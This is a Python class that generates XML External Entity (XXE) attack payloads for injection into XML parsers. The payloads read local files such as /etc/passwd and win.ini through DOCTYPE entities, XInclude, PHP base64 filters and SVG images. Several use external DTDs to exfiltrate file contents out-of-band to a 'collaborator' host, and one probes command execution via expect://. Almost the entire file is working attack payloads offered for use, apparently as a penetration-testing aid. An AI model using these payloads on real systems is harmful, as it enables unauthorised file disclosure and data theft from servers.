class XXEGenerator:
    def generate_payloads(self, target_url="", collaborator="", attack_type="all"):
        if not target_url:
            target_url = "file:///etc/passwd"
        if not collaborator:
            collaborator = "http://localhost:5000"
        if attack_type not in ["all", "doctype", "xinclude", "dtd", "svg"]:
            attack_type = "all"

        payloads = []
        if attack_type in ["all", "doctype"]:
            payloads.extend(self._doctype(collaborator, target_url))
        if attack_type in ["all", "xinclude"]:
            payloads.extend(self._xinclude(target_url))
        if attack_type in ["all", "dtd"]:
            payloads.extend(self._dtd(collaborator))
        if attack_type in ["all", "svg"]:
            payloads.extend(self._svg(target_url))
        return payloads

    def _doctype(self, collaborator, target_url):
        return [
            {
                "name": "DOCTYPE - Basic File Read",
                "type": "doctype",
                "description": "Read local file using SYSTEM entity",
                "payload": '<?xml version="1.0"?>\n<!DOCTYPE data [\n<!ENTITY xxe SYSTEM "{}">\n]>\n<data>&xxe;</data>'.format(target_url)
            },
            {
                "name": "DOCTYPE - OOB External DTD",
                "type": "doctype",
                "description": "Out-of-band exfiltration via external DTD",
                "payload": '<?xml version="1.0"?>\n<!DOCTYPE data [\n<!ENTITY % ext SYSTEM "{}/evil.dtd">\n%ext;\n%payload;\n%exfil;\n]>\n<data>xxe</data>'.format(collaborator)
            },
            {
                "name": "DOCTYPE - Windows win.ini",
                "type": "doctype",
                "description": "Read Windows win.ini",
                "payload": '<?xml version="1.0"?>\n<!DOCTYPE data [\n<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">\n]>\n<data>&xxe;</data>'
            },
            {
                "name": "DOCTYPE - Linux /etc/passwd",
                "type": "doctype",
                "description": "Read Linux /etc/passwd",
                "payload": '<?xml version="1.0"?>\n<!DOCTYPE data [\n<!ENTITY xxe SYSTEM "file:///etc/passwd">\n]>\n<data>&xxe;</data>'
            },
            {
                "name": "DOCTYPE - PHP Base64 Filter",
                "type": "doctype",
                "description": "Read file as base64 via PHP filter",
                "payload": '<?xml version="1.0"?>\n<!DOCTYPE data [\n<!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=/etc/passwd">\n]>\n<data>&xxe;</data>'
            },
            {
                "name": "DOCTYPE - Blind OOB Parameter Entity",
                "type": "doctype",
                "description": "Blind XXE using parameter entities",
                "payload": '<?xml version="1.0"?>\n<!DOCTYPE foo [\n<!ENTITY % xxe SYSTEM "{}/xxe">\n%xxe;\n]>\n<foo/>'.format(collaborator)
            },
        ]

    def _xinclude(self, target_url):
        return [
            {
                "name": "XInclude - Basic",
                "type": "xinclude",
                "description": "Include external resource via XInclude",
                "payload": '<data xmlns:xi="http://www.w3.org/2001/XInclude">\n<xi:include href="{}" parse="text"/>\n</data>'.format(target_url)
            },
            {
                "name": "XInclude - With UTF-8 Encoding",
                "type": "xinclude",
                "description": "XInclude with explicit UTF-8 encoding",
                "payload": '<data xmlns:xi="http://www.w3.org/2001/XInclude">\n<xi:include href="{}" parse="text" encoding="UTF-8"/>\n</data>'.format(target_url)
            },
            {
                "name": "XInclude - /etc/passwd",
                "type": "xinclude",
                "description": "Read /etc/passwd via XInclude",
                "payload": '<data xmlns:xi="http://www.w3.org/2001/XInclude">\n<xi:include href="file:///etc/passwd" parse="text"/>\n</data>'
            },
        ]

    def _dtd(self, collaborator):
        return [
            {
                "name": "DTD - External Entity Exfil",
                "type": "dtd",
                "description": "Exfiltrate data via external DTD",
                "payload": '<!ENTITY % file SYSTEM "file:///etc/passwd">\n<!ENTITY % dtd SYSTEM "{}/evil.dtd">\n%dtd;\n%exfil;'.format(collaborator)
            },
            {
                "name": "DTD - OOB via HTTP",
                "type": "dtd",
                "description": "Out-of-band data exfiltration over HTTP",
                "payload": '<!ENTITY % payload SYSTEM "file:///etc/passwd">\n<!ENTITY % param1 "<!ENTITY exfil SYSTEM \'{}/exfil?data=%payload;\'>">\n%param1;\n&exfil;'.format(collaborator)
            },
            {
                "name": "DTD - Base64 OOB",
                "type": "dtd",
                "description": "Exfiltrate base64-encoded file content",
                "payload": '<!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=/etc/passwd">\n<!ENTITY % dtd SYSTEM "{}/evil.dtd">\n%dtd;\n%exfil;'.format(collaborator)
            },
        ]

    def _svg(self, target_url):
        return [
            {
                "name": "SVG - Basic XXE",
                "type": "svg",
                "description": "XXE embedded inside SVG image",
                "payload": '<?xml version="1.0" standalone="yes"?>\n<!DOCTYPE svg [\n<!ENTITY xxe SYSTEM "{}">\n]>\n<svg xmlns="http://www.w3.org/2000/svg" width="300" height="200">\n<text>&xxe;</text>\n</svg>'.format(target_url)
            },
            {
                "name": "SVG - XLink Href",
                "type": "svg",
                "description": "SVG using xlink:href for resource inclusion",
                "payload": '<svg xmlns="http://www.w3.org/2000/svg"\n     xmlns:xlink="http://www.w3.org/1999/xlink"\n     width="300" height="200">\n<image xlink:href="expect://id"></image>\n</svg>'
            },
            {
                "name": "SVG - Embedded Script XXE",
                "type": "svg",
                "description": "XXE via SVG with embedded entity in text element",
                "payload": '<?xml version="1.0"?>\n<!DOCTYPE svg [\n<!ENTITY read SYSTEM "{}">\n]>\n<svg xmlns="http://www.w3.org/2000/svg">\n<text x="10" y="20">&read;</text>\n</svg>'.format(target_url)
            },
        ]
